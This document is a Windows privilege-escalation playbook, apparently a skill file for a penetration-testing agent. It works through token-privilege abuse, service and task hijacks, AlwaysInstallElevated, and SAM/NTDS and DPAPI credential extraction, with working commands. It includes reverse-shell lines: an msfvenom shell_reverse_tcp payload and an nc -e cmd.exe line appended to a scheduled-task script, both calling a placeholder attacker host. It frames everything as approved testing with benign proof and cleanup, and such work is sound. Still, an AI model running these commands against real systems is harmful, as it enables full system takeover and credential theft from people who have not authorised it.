# Windows privilege-escalation playbook
# In-scope host, approval-gated, BENIGN proof (whoami=nt authority\system), ALWAYS clean up. Lowest-risk first.
# Enumeration first — see refs/enumeration.md (winPEAS + whoami /all). This file turns a found vector into benign SYSTEM.
## Vector picker (lowest-risk → highest-risk)
1. token privilege (SeImpersonate/SeBackup/SeTakeOwnership)  2. saved creds / runas  3. weak service perms/DACL
4. unquoted service path  5. AlwaysInstallElevated  6. scheduled-task / autorun hijack  7. DLL hijack
8. kernel/patch CVE (HIGH RISK — last resort)

Always prove with `whoami` (= `nt authority\system`) + ONE benign command, back up anything you replace,
record every change in `cleanup.md`, and restore.

═══════════════════════════════════════════════════════════════════════════
## 1. Token privileges (whoami /priv)  — usually the fastest, safest win
═══════════════════════════════════════════════════════════════════════════
- **SeImpersonate / SeAssignPrimaryToken** (common on IIS/MSSQL/service accounts) → a "Potato" to SYSTEM:
  ```
  PrintSpoofer.exe -i -c "cmd /c whoami"      # benign proof as SYSTEM
  GodPotato -cmd "cmd /c whoami"              # modern, works where JuicyPotato doesn't
  # JuicyPotatoNG / RoguePotato for older builds. Prove id; do NOT drop persistence.
  ```
- **SeBackupPrivilege** → read protected files (SAM/SYSTEM) without being admin:
  ```
  reg save hklm\sam  C:\Windows\Temp\sam  &  reg save hklm\system C:\Windows\Temp\system
  # offline: secretsdump.py -sam sam -system system LOCAL   (feasibility proof; then psexec -hashes ...)
  ```
- **SeTakeOwnership** → own a SYSTEM binary and swap an accessibility tool (utilman):
  ```
  takeown /f C:\Windows\System32\Utilman.exe
  icacls C:\Windows\System32\Utilman.exe /grant <me>:F
  copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe   # BACK UP the original first!
  # at the lock screen press Win+U -> SYSTEM cmd. RESTORE Utilman.exe immediately after proof.
  ```
- **SeRestore** → write to protected locations (hijack a service binary / image-hijack). **SeDebug** → open
  lsass (feasibility only; avoid dumping). Each is a one-step win — exhaust these before any exploit.

═══════════════════════════════════════════════════════════════════════════
## 2. Saved credentials / runas
═══════════════════════════════════════════════════════════════════════════
```
cmdkey /list                                   # stored creds present?
runas /savecred /user:<DOMAIN\admin> "cmd /c whoami"    # reuse without knowing the password
# also: autologon DefaultPassword (reg), Unattend.xml, web.config connectionString, PuTTY proxy, PS history
```

═══════════════════════════════════════════════════════════════════════════
## 3. Weak service permissions / DACL
═══════════════════════════════════════════════════════════════════════════
- **Reconfigure a service you can change** (SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS):
  ```
  accesschk.exe -accepteula -uwcqv "Users" <svc>     # BUILTIN\Users : SERVICE_ALL_ACCESS ?
  sc qc <svc>                                         # current binPath + 'obj' (run-as) account
  sc config <svc> binPath= "C:\Windows\Temp\rev.exe" obj= LocalSystem     # (keep original to restore)
  sc stop <svc> & sc start <svc>                      # runs your benign exe as SYSTEM; then RESTORE binPath
  ```
- **Writable service EXE** (`icacls <svc>.exe` shows your group `(M)`/`(F)`): back up the original, drop a
  benign marker exe, `sc stop/start`, confirm, RESTORE the original binary.
- **Service payload** (benign reverse/marker as a *service* exe so SCM doesn't kill it):
  ```
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe-service -o rev.exe
  ```

═══════════════════════════════════════════════════════════════════════════
## 4. Unquoted service path
═══════════════════════════════════════════════════════════════════════════
A service path with spaces and no quotes (`C:\Program Files\My App\svc.exe`) lets Windows try
`C:\Program.exe`, `C:\Program Files\My.exe`, … — if you can write an earlier segment, you win.
```
Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | select Name,PathName
icacls "C:\Program Files\My App"                      # writable (Users:(WD)/(M)) earlier segment?
# drop a benign exe at the hijack point, e.g. C:\Program Files\My.exe ; icacls it /grant Everyone:F
sc stop <svc> & sc start <svc>                        # confirm whoami=SYSTEM ; REMOVE the planted exe
```

═══════════════════════════════════════════════════════════════════════════
## 5. AlwaysInstallElevated
═══════════════════════════════════════════════════════════════════════════
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # =1 ?
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # =1 (BOTH required)
msfvenom -p windows/x64/exec CMD='cmd /c whoami > C:\Windows\Temp\pe.txt' -f msi -o m.msi   # benign
msiexec /quiet /qn /i m.msi                          # runs as SYSTEM; read pe.txt; uninstall + delete m.msi
```

═══════════════════════════════════════════════════════════════════════════
## 6. Scheduled task / autorun hijack
═══════════════════════════════════════════════════════════════════════════
```
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"   # a task Run As SYSTEM
icacls "C:\path\to\task-script.bat"                  # writable by you?
echo C:\Tools\nc64.exe -e cmd.exe <ip> 4444 >> <writable-task-script>   # benign marker preferred; BACK UP
schtasks /run /tn "<TaskName>"                       # confirm, then RESTORE the script
```
Same idea for writable autorun entries (`HKLM\...\Run`) and writable Startup folder items.

═══════════════════════════════════════════════════════════════════════════
## 7. DLL hijack / 8. Kernel — HIGH RISK, LAST RESORT
═══════════════════════════════════════════════════════════════════════════
- **DLL hijack:** a service/app loads a missing DLL from a writable dir on its search path → drop a benign
  proxy DLL, trigger a load, confirm, REMOVE. (Find with ProcMon "NAME NOT FOUND" on `.dll`.)
- **Kernel/patch CVE:** `wes.py systeminfo.txt` (offline) or winPEAS. A kernel exploit can **crash prod** —
  on a live host REPORT FEASIBILITY and run only in an approved window. Recognise: PrintNightmare
  (CVE-2021-1675/34527), HiveNightmare/SeriousSAM (CVE-2021-36934, readable SAM), SMBGhost, and the AD
  quick-wins (Zerologon, noPac) which belong to the ad-* skills.

═══════════════════════════════════════════════════════════════════════════
## Proof + cleanup  (every run)
═══════════════════════════════════════════════════════════════════════════
- Prove: `whoami` = `nt authority\system` (or a new admin) + ONE benign command. No more.
- `cleanup.md` lists EVERYTHING created/changed: dropped tools (`wp.exe`, potato exes, `m.msi`, `rev.exe`),
  service binPath/DACL edits (with original restored), replaced binaries (Utilman, service exe — originals
  backed up + restored), registry/task edits, saved SAM/SYSTEM copies (delete them) — each confirmed reverted.
- NO persistence, NO backdoors, NO destruction, NO bulk credential dumping beyond proving the vector.
  In-scope host only.

---

## Extended arsenal — privilege→primitive table, potato family, backup/volume primitives, offline secret stores, more SYSTEM paths
# Append-only extension. Same ethos: in-scope host, BENIGN proof (whoami = nt authority\system), lowest-risk first; back up
# anything you replace, REDACT every recovered secret to a fingerprint, record in cleanup.md, restore. CVE/driver = last resort.

### A. Privilege → primitive quick table (whoami /priv)
| privilege | primitive → benign SYSTEM/admin proof |
|---|---|
| SeImpersonatePrivilege        | named-pipe token theft → "potato" (see §1 / §B)           |
| SeAssignPrimaryTokenPrivilege | assign a stolen primary token → potato family (§B)        |
| SeBackupPrivilege             | read-bypass: copy SAM/SYSTEM/NTDS offline (§1, §C)        |
| SeRestorePrivilege            | write-bypass: overwrite a SYSTEM file / service DLL (§C)   |
| SeTakeOwnershipPrivilege      | own+ACL a SYSTEM binary (utilman — see §1)                |
| SeManageVolumePrivilege       | full DACL on C:\ → arbitrary write → System32 DLL (§C)    |
| SeDebugPrivilege              | open any process (feasibility only; do NOT dump lsass)    |
| SeLoadDriverPrivilege         | load a known-vuln signed driver → ring-0 (BYOVD, HIGH-RISK)|
| SeCreateTokenPrivilege        | craft a SYSTEM token directly (rare; NtCreateToken)       |
| SeTcbPrivilege                | act as part of the OS → build a SYSTEM token              |
| SeRelabelPrivilege            | rewrite a resource's integrity label                      |
Exhaust these one-step wins before any exploit. SeLoadDriver / BYOVD = HIGH-RISK, approval-gated, last resort.

### B. Named-pipe impersonation ("potato") family — technique level
```
# Mechanism: you hold SeImpersonate/SeAssignPrimaryToken → coerce a SYSTEM service to auth to a named pipe you control →
#   ImpersonateNamedPipeClient() → duplicate the SYSTEM token → spawn a benign whoami. Choose by coercion vector:
#   - PrintSpoofer — spooler MS-RPRN pipe (spooler reachable)          [tool named in §1]
#   - GodPotato / DCOMPotato — DCOM OXID/ISystemActivator (modern, no spooler needed)
#   - EfsPotato / SharpEfsPotato — MS-EFSR (lsarpc/efsrpc) coercion
#   - RoguePotato / JuicyPotatoNG — OXID-resolver redirect (older builds)
#   - LocalPotato — CVE-2023-21746 local NTLM reflection (patched host → feasibility-only)
whoami /priv | findstr /i impersonate                 # confirm SeImpersonate present + enabled
<potato>.exe -c "cmd /c whoami > C:\Windows\Temp\pe.txt"   # benign proof; read pe.txt (=SYSTEM); DELETE it. No persistence.
```

### C. SeBackup / SeRestore / SeManageVolume — more primitives (handle hives offline, then delete)
```
# SeBackup reads locked/forbidden files via backup semantics — beyond `reg save` (§1):
robocopy /b C:\Windows\NTDS C:\Windows\Temp\o ntds.dit        # /b = backup mode (bypass DACL); DELETE copy after offline parse
# Locked SAM/SYSTEM/NTDS → Volume Shadow Copy (read the snapshot, no live-file lock):
diskshadow /s script.txt   # script: set context persistent nowriters / add volume C: alias x / create / expose %x% Z:
copy Z:\Windows\System32\config\SAM C:\Windows\Temp\ & copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\   # then: diskshadow delete shadows
esentutl /y /vss C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\ntds.dit         # alt VSS copy of a locked DB
# Offline ONLY, then DELETE every hive/dit copy: secretsdump.py -sam SAM -system SYSTEM LOCAL   (store HASHES REDACTED).
# SeRestore — write-bypass: replace a service binary / set an Image-File-Execution-Options debugger (back up original, RESTORE).
# SeManageVolume — grant yourself full control on C:\ root, then plant a benign DLL a SYSTEM process loads from System32;
#   trigger the load, confirm whoami=SYSTEM, then REMOVE the DLL and the DACL change.
```

### D. Offline credential & secret stores — enumerate, validate, REDACT everything
```
# DPAPI blobs: masterkeys %APPDATA%\Microsoft\Protect\<SID>\ ; Credential Manager %APPDATA%\Microsoft\Credentials\, %LOCALAPPDATA%\...
vaultcmd /listcreds:"Windows Credentials" /all        # Credential Vault entry NAMES (values via SharpDPAPI offline — REDACT)
# LSA secrets / cached domain creds (service-account passwords live here) → export hives, parse offline:
reg save hklm\security C:\Windows\Temp\security & reg save hklm\system C:\Windows\Temp\system
#   secretsdump.py -security security -system system LOCAL    (DELETE hives after; keep only redacted fingerprints)
# Browsers: <profile>\Login Data (SQLite) + Local State (DPAPI-wrapped AES key). Wi-Fi PSKs:
netsh wlan show profile name="<ssid>" key=clear | findstr Key          # REDACT the recovered key
# Rule: recover to PROVE the exposure, fingerprint the secret, never store or reuse the plaintext.
```

### E. GPP cpassword, LAPS, service-recovery command, COM-hijack, UAC/integrity context
```
# GPP cpassword (domain) — the AES key is public, so any SYSVOL-readable user can decrypt:
findstr /S /I cpassword \\<domain>\SYSVOL\*.xml        # Groups/Services/ScheduledTasks.xml → gpp-decrypt (REDACT)
# LAPS — if your principal is entitled to read ms-Mcs-AdmPwd, the local-admin password is readable (REDACT):
Get-ADComputer <host> -Properties ms-Mcs-AdmPwd | select -Expand ms-Mcs-AdmPwd      # or LAPSToolkit / Get-LAPSADPassword
# Service recovery/failure command runs as SYSTEM on crash (needs SERVICE_CHANGE_CONFIG on the svc):
sc qc <svc>                                            # save current config to restore
sc failure <svc> reset= 0 actions= run/0 command= "cmd /c whoami > C:\Windows\Temp\pe.txt"
taskkill /f /pid <svc_pid>                             # force a non-clean exit → SYSTEM runs your benign marker; then RESTORE config
# COM hijack — a privileged process/scheduled-task resolves a CLSID from a writable/empty InprocServer32:
reg add HKCU\Software\Classes\CLSID\{<clsid>}\InprocServer32 /ve /d C:\Windows\Temp\benign.dll /f   # per-user → usually
#   persistence/lateral; yields SYSTEM only if a high-integrity process loads that CLSID. Confirm, then REMOVE the key.
# Context awareness: whoami /groups → is your admin token UAC-filtered (Medium IL)? Then the win is a UAC bypass
#   (fodhelper / computerdefaults / silentcleanup) to High IL — same-user, NOT a cross-account privesc; label it honestly.
```
